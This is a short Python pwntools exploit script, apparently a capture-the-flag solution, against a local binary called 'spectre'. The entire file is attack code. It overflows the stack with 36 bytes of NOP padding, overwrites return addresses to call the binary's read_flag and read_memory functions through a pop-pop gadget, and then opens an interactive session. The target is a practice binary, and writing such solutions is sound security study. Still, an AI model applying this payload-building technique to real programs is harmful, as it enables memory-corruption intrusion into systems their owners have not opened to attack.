#!/usr/bin/env python2

from pwn import *

r = process("./spectre")
b = ELF('./spectre')
context(binary=b)

# Functions we're jumping in to
READ_MEM  = b.symbols['read_memory']
READ_FLAG = b.symbols['read_flag']

# Symbols we want on the stack
FLAG = b.symbols['flag']
ARRY = b.symbols['b']
ADDR = FLAG - ARRY
POP2 = 0x08048a3d
RLEN = 0x30

# Padding
payload = ''
payload += "\x90"*36

# Read Flag
payload += p32(READ_FLAG)

# Read Memory
payload += p32(READ_MEM)
payload += p32(POP2)
payload += p32(ADDR)
payload += p32(RLEN)

# Send payload
r.sendline(payload)
r.interactive()
